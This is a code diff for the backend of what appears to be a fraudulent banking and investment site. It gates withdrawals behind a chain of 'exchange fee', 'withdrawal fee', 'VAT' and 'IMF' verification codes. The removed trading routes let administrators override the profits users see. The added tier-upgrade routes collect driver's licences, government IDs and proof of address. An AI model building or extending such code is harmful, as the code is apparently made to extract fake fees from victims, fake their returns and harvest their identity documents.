@@ -74,25 +74,31 @@ const verifyStep = (field, usedField, nextStep, notifyFn) => async (req, res) =>
 };
 router.post('/withdrawals/verify-exchange-fee', authMiddleware, verifyStep('exchange_fee_code', 'exchange_fee_used', 3, (u) => telegram.notifyWithdrawalFeeRequested(u)));
 router.post('/withdrawals/verify-withdrawal-fee', authMiddleware, verifyStep('withdrawal_fee_code', 'withdrawal_fee_used', 4, (u) => telegram.notifyVATRequested(u)));
-router.post('/withdrawals/verify-vat', authMiddleware, verifyStep('vat_code', 'vat_used', 5, (u) => telegram.notifyIMFRequested(u)));
-router.post('/withdrawals/verify-imf', authMiddleware, async (req, res) => {
+router.post('/withdrawals/verify-vat', authMiddleware, async (req, res) => {
+  const client = await pool.connect();
   try {
     const u = req.user;
-    const s = await pool.query('SELECT * FROM withdrawal_sessions WHERE user_id=$1', [u.id]);
-    if (!s.rows[0]) return res.status(404).json({ error: 'No active session' });
-    const sess = s.rows[0];
-    if (!sess.imf_code) return res.status(400).json({ error: 'IMF code not generated yet.' });
-    if (sess.imf_used) return res.status(400).json({ error: 'Code already used' });
-    if (sess.imf_code !== req.body.code?.toUpperCase()) return res.status(400).json({ error: 'Invalid IMF code' });
+    await client.query('BEGIN');
+    const result = await client.query('SELECT * FROM withdrawal_sessions WHERE user_id=$1 FOR UPDATE', [u.id]);
+    if (!result.rows[0]) { await client.query('ROLLBACK'); return res.status(404).json({ error: 'No active withdrawal session' }); }
+    const sess = result.rows[0];
+    if (!sess.vat_code) { await client.query('ROLLBACK'); return res.status(400).json({ error: 'VAT code has not been generated. Contact Customer Service.' }); }
+    if (sess.vat_used) { await client.query('ROLLBACK'); return res.status(400).json({ error: 'VAT code already used' }); }
+    if (sess.vat_code !== String(req.body.code || '').toUpperCase()) { await client.query('ROLLBACK'); return res.status(400).json({ error: 'Invalid VAT code' }); }
+    const freshUser = await client.query('SELECT balance FROM users WHERE id=$1 FOR UPDATE', [u.id]);
+    if (!freshUser.rows[0] || Number(freshUser.rows[0].balance) < Number(sess.amount)) { await client.query('ROLLBACK'); return res.status(400).json({ error: 'Insufficient balance' }); }
     const refId = generateReferenceId();
-    await pool.query('INSERT INTO withdrawals(user_id,amount,currency,account_number,account_name,bank_name,transfer_type,reference_id) VALUES($1,$2,$3,$4,$5,$6,$7,$8)', [u.id, sess.amount, sess.currency, sess.account_number, sess.account_name, sess.bank_name, sess.transfer_type, refId]);
-    await pool.query('UPDATE users SET balance=balance-$1 WHERE id=$2', [sess.amount, u.id]);
-    await pool.query("INSERT INTO transactions(user_id,type,amount,currency,status,reference_id,description) VALUES($1,'withdrawal',$2,$3,'pending',$4,$5)", [u.id, sess.amount, sess.currency, refId, `Withdrawal to ${sess.account_name}`]);
-    await pool.query('DELETE FROM withdrawal_sessions WHERE user_id=$1', [u.id]);
-    await pool.query(`INSERT INTO notifications(user_id,type,title,message) VALUES($1,'info','Withdrawal Pending Approval',$2)`, [u.id, `Your withdrawal of ${sess.currency} ${sess.amount} is pending final approval.`]);
+    await client.query('UPDATE withdrawal_sessions SET vat_used=true,current_step=5,updated_at=NOW() WHERE user_id=$1', [u.id]);
+    await client.query('INSERT INTO withdrawals(user_id,amount,currency,account_number,account_name,bank_name,transfer_type,reference_id) VALUES($1,$2,$3,$4,$5,$6,$7,$8)', [u.id, sess.amount, sess.currency, sess.account_number, sess.account_name, sess.bank_name, sess.transfer_type, refId]);
+    await client.query('UPDATE users SET balance=balance-$1 WHERE id=$2', [sess.amount, u.id]);
+    await client.query("INSERT INTO transactions(user_id,type,amount,currency,status,reference_id,description) VALUES($1,'withdrawal',$2,$3,'pending',$4,$5)", [u.id, sess.amount, sess.currency, refId, `Withdrawal to ${sess.account_name}`]);
+    await client.query('DELETE FROM withdrawal_sessions WHERE user_id=$1', [u.id]);
+    await client.query("INSERT INTO notifications(user_id,type,title,message) VALUES($1,'info','Withdrawal Pending Approval',$2)", [u.id, `Your withdrawal of ${sess.currency} ${sess.amount} is pending final admin approval.`]);
+    await client.query('COMMIT');
     await telegram.notifyWithdrawalReady(u, `${sess.currency} ${sess.amount}`);
-    res.json({ message: 'All codes verified! Withdrawal is pending final admin approval.', reference: refId });
-  } catch (e) { console.error(e); res.status(500).json({ error: 'Submission failed' }); }
+    res.json({ message: 'VAT verified. Withdrawal is pending final admin approval.', reference: refId });
+  } catch (e) { await client.query('ROLLBACK'); console.error(e); res.status(500).json({ error: 'Submission failed' }); }
+  finally { client.release(); }
 });
 router.get('/withdrawals', authMiddleware, async (req, res) => {
   try { const r = await pool.query('SELECT * FROM withdrawals WHERE user_id=$1 ORDER BY created_at DESC', [req.user.id]); res.json(r.rows); }
@@ -169,37 +175,6 @@ router.post('/kyc', authMiddleware, upload.fields([{ name: 'document_front', max
 });
 router.get('/kyc/status', authMiddleware, async (req, res) => {
   try { const r = await pool.query('SELECT status,admin_note,created_at FROM kyc_verifications WHERE user_id=$1 ORDER BY created_at DESC LIMIT 1', [req.user.id]); res.json(r.rows[0] || { status: 'unverified' }); }
-  catch (e) { res.status(500).json({ error: 'Failed' }); }
-});
-
-// ===== INVESTMENTS =====
-router.get('/investments/plans', async (req, res) => {
-  try { const r = await pool.query('SELECT * FROM investment_plans WHERE is_active=true ORDER BY minimum_amount ASC'); res.json(r.rows); }
-  catch (e) { res.status(500).json({ error: 'Failed' }); }
-});
-router.post('/investments/invest', authMiddleware, async (req, res) => {
-  try {
-    const u = req.user;
-    if (u.kyc_status !== 'verified') return res.status(403).json({ error: 'KYC required to invest' });
-    const { plan_id, amount } = req.body;
-    const plan = await pool.query('SELECT * FROM investment_plans WHERE id=$1 AND is_active=true', [plan_id]);
-    if (!plan.rows[0]) return res.status(404).json({ error: 'Investment plan not found' });
-    const p = plan.rows[0];
-    if (parseFloat(amount) < parseFloat(p.minimum_amount)) return res.status(400).json({ error: `Minimum investment is $${p.minimum_amount}` });
-    if (parseFloat(amount) > parseFloat(u.balance)) return res.status(400).json({ error: 'Insufficient balance' });
-    const maturityDate = new Date(Date.now() + p.duration_days * 86400000);
-    const refId = generateReferenceId();
-    await pool.query('UPDATE users SET balance=balance-$1 WHERE id=$2', [amount, u.id]);
-    const r = await pool.query('INSERT INTO investments(user_id,plan_id,amount,expected_return,maturity_date,currency,reference_id) VALUES($1,$2,$3,$4,$5,$6,$7) RETURNING *', [u.id, plan_id, amount, p.return_amount, maturityDate, u.preferred_currency || u.currency, refId]);
-    await pool.query("INSERT INTO transactions(user_id,type,amount,currency,status,reference_id,description) VALUES($1,'debit',$2,$3,'completed',$4,$5)", [u.id, amount, u.preferred_currency || u.currency, refId, `Investment — ${p.name} plan`]);
-    await telegram.notifyInvestment(u, amount, p.name);
-    await emailCfg.sendInvestmentEmail(u.email, `${u.first_name} ${u.last_name}`, p.name, amount, p.return_amount, maturityDate);
-    await pool.query(`INSERT INTO notifications(user_id,type,title,message) VALUES($1,'success','Investment Confirmed ✅',$2)`, [u.id, `$${amount} invested in ${p.name} plan. Expected return: $${p.return_amount} on ${maturityDate.toLocaleDateString()}`]);
-    res.status(201).json({ message: 'Investment successful', investment: r.rows[0] });
-  } catch (e) { console.error(e); res.status(500).json({ error: 'Investment failed' }); }
-});
-router.get('/investments/my', authMiddleware, async (req, res) => {
-  try { const r = await pool.query('SELECT i.*,p.name as plan_name,p.duration_days FROM investments i JOIN investment_plans p ON i.plan_id=p.id WHERE i.user_id=$1 ORDER BY i.created_at DESC', [req.user.id]); res.json(r.rows); }
   catch (e) { res.status(500).json({ error: 'Failed' }); }
 });
 
@@ -391,88 +366,30 @@ router.get('/settings/exchange-rates', async (req, res) => {
 
 module.exports = router;
 
-// ============ TRADING / INVESTMENTS ============
-
-// Get all assets
-router.get('/trading/assets', authMiddleware, async (req, res) => {
-  try {
-    const r = await pool.query('SELECT * FROM trading_assets WHERE is_active=true ORDER BY category,name');
-    res.json(r.rows);
-  } catch(e) { res.status(500).json({ error: 'Failed' }); }
+// ===== ACCOUNT TIER UPGRADE REQUESTS =====
+router.get('/account-tier/upgrade-info', authMiddleware, async (req, res) => {
+  try { const r = await pool.query("SELECT value FROM system_settings WHERE key='tier_upgrade_description'"); res.json({ description: r.rows[0]?.value || '' }); }
+  catch (e) { res.status(500).json({ error: 'Could not load upgrade information' }); }
 });
-
-// Get user portfolio
-router.get('/trading/portfolio', authMiddleware, async (req, res) => {
-  try {
-    const r = await pool.query(`
-      SELECT t.*, a.icon, a.color, a.category,
-        CASE WHEN t.admin_pnl_override IS NOT NULL AND t.admin_pnl_set_at IS NOT NULL
-          AND NOW() > t.created_at + INTERVAL '2 days'
-          THEN t.admin_pnl_override
-          ELSE CASE WHEN NOW() < t.created_at + INTERVAL '2 days' THEN 0 ELSE t.pnl END
-        END as display_pnl
-      FROM user_trades t JOIN trading_assets a ON t.asset_id=a.id
-      WHERE t.user_id=$1 AND t.status='active'
-      ORDER BY t.created_at DESC
-    `, [req.user.id]);
-    res.json(r.rows);
-  } catch(e) { res.status(500).json({ error: 'Failed' }); }
+router.get('/account-tier/requests', authMiddleware, async (req, res) => {
+  try { const r = await pool.query('SELECT id, requested_tier, document_type, status, admin_note, created_at, reviewed_at FROM tier_upgrade_requests WHERE user_id=$1 ORDER BY created_at DESC', [req.user.id]); res.json(r.rows); }
+  catch (e) { res.status(500).json({ error: 'Could not load upgrade requests' }); }
 });
-
-// Buy asset
-router.post('/trading/buy', authMiddleware, async (req, res) => {
+router.post('/account-tier/requests', authMiddleware, upload.single('document'), async (req, res) => {
   try {
-    const { asset_id, amount } = req.body;
-    if (!asset_id || !amount || parseFloat(amount) <= 0) return res.status(400).json({ error: 'Invalid input' });
-    if (parseFloat(amount) > parseFloat(req.user.balance || 0)) return res.status(400).json({ error: 'Insufficient balance' });
-    const asset = await pool.query('SELECT * FROM trading_assets WHERE id=$1', [asset_id]);
-    if (!asset.rows[0]) return res.status(404).json({ error: 'Asset not found' });
-    const a = asset.rows[0];
-    const qty = parseFloat(amount) / parseFloat(a.current_price);
-    const refId = require('../utils/helpers').generateReferenceId();
-    const trade = await pool.query(
-      `INSERT INTO user_trades(user_id,asset_id,asset_symbol,asset_name,type,quantity,buy_price,current_price,amount_invested,current_value,pnl,reference_id)
-       VALUES($1,$2,$3,$4,'buy',$5,$6,$6,$7,$7,0,$8) RETURNING *`,
-      [req.user.id, asset_id, a.symbol, a.name, qty, a.current_price, amount, refId]
-    );
-    await pool.query('UPDATE users SET balance=balance-$1 WHERE id=$2', [amount, req.user.id]);
-    const txRefId = require('../utils/helpers').generateReferenceId();
-    await pool.query(
-      `INSERT INTO transactions(user_id,type,amount,currency,status,reference_id,description) VALUES($1,'debit',$2,$3,'completed',$4,$5)`,
-      [req.user.id, amount, req.user.preferred_currency||'USD', txRefId, `Bought ${qty.toFixed(6)} ${a.symbol}`]
-    );
-    await pool.query(`INSERT INTO notifications(user_id,type,title,message) VALUES($1,'success','Trade Executed 📈',$2)`,
-      [req.user.id, `You bought ${qty.toFixed(6)} ${a.symbol} (${a.name}) for $${parseFloat(amount).toLocaleString()}`]);
-    await require('../config/ntfy').send('📈 New Trade', `${req.user.first_name} ${req.user.last_name} bought $${amount} of ${a.name}`, 'default');
-    res.json({ success: true, trade: trade.rows[0] });
-  } catch(e) { console.error(e); res.status(500).json({ error: 'Failed' }); }
-});
-
-// Get trade history
-router.get('/trading/history', authMiddleware, async (req, res) => {
-  try {
-    const r = await pool.query(`
-      SELECT t.*, a.icon, a.color FROM user_trades t
-      JOIN trading_assets a ON t.asset_id=a.id
-      WHERE t.user_id=$1 ORDER BY t.created_at DESC LIMIT 50
-    `, [req.user.id]);
-    res.json(r.rows);
-  } catch(e) { res.status(500).json({ error: 'Failed' }); }
-});
-
-// Sell asset
-router.post('/trading/sell/:tradeId', authMiddleware, async (req, res) => {
-  try {
-    const trade = await pool.query('SELECT t.*,a.current_price as market_price FROM user_trades t JOIN trading_assets a ON t.asset_id=a.id WHERE t.id=$1 AND t.user_id=$2', [req.params.tradeId, req.user.id]);
-    if (!trade.rows[0]) return res.status(404).json({ error: 'Trade not found' });
-    const t = trade.rows[0];
-    const sellValue = t.admin_pnl_override !== null ? parseFloat(t.amount_invested) + parseFloat(t.admin_pnl_override) : parseFloat(t.current_value);
-    await pool.query("UPDATE user_trades SET status='closed',current_value=$1,pnl=$2,updated_at=NOW() WHERE id=$3",
-      [sellValue, sellValue - parseFloat(t.amount_invested), t.id]);
-    await pool.query('UPDATE users SET balance=balance+$1 WHERE id=$2', [sellValue, req.user.id]);
-    const refId = require('../utils/helpers').generateReferenceId();
-    await pool.query(`INSERT INTO transactions(user_id,type,amount,currency,status,reference_id,description) VALUES($1,'credit',$2,$3,'completed',$4,$5)`,
-      [req.user.id, sellValue, req.user.preferred_currency||'USD', refId, `Sold ${t.asset_symbol} position`]);
-    res.json({ success: true, sold_for: sellValue, pnl: sellValue - parseFloat(t.amount_invested) });
-  } catch(e) { res.status(500).json({ error: 'Failed' }); }
+    const tier = Number(req.body.tier);
+    const documentType = ({1: 'drivers_license', 2: 'government_id', 3: 'proof_of_address'})[tier];
+    if (!documentType) return res.status(400).json({ error: 'Choose a valid tier from 1 to 3' });
+    if (!req.file) return res.status(400).json({ error: 'Please attach the required verification document.' });
+    const currentTier = Number(req.user.account_tier || 0);
+    if (tier <= currentTier) return res.status(400).json({ error: 'You can only request a higher account tier' });
+    const existing = await pool.query("SELECT id FROM tier_upgrade_requests WHERE user_id=$1 AND status='pending' LIMIT 1", [req.user.id]);
+    if (existing.rows.length) return res.status(409).json({ error: 'You already have a pending tier upgrade request' });
+    const { data: stored, error: storageError } = await require('../config/storage').supabase.storage.from('atlasvault-tier-documents').upload(`tier-upgrades/${req.user.id}/${Date.now()}-${require('crypto').randomUUID()}-${require('path').basename(req.file.originalname).replace(/[^a-zA-Z0-9._-]/g,'_')}`, req.file.buffer, { contentType: req.file.mimetype, upsert: false });
+    if (storageError) { console.error('Tier document storage error:', storageError.message); return res.status(502).json({ error: 'Could not store your document. Please try again later.' }); }
+    const r = await pool.query('INSERT INTO tier_upgrade_requests(user_id, requested_tier, document_type, document_storage_path) VALUES($1,$2,$3,$4) RETURNING id, requested_tier, document_type, status, created_at', [req.user.id, tier, documentType, stored.path]);
+    const message = `Hello, I have submitted a request to upgrade my account to Tier ${tier}. My request reference is #${r.rows[0].id}. Please review it and let me know if anything else is needed.`;
+    await pool.query("INSERT INTO customer_service_messages(user_id,sender,message) VALUES($1,'user',$2)", [req.user.id, message]);
+    res.status(201).json({ request: r.rows[0], message: 'Upgrade request and document submitted.' });
+  } catch (e) { console.error('Tier request error:', e.message); res.status(500).json({ error: 'Could not submit tier upgrade request' }); }
 });
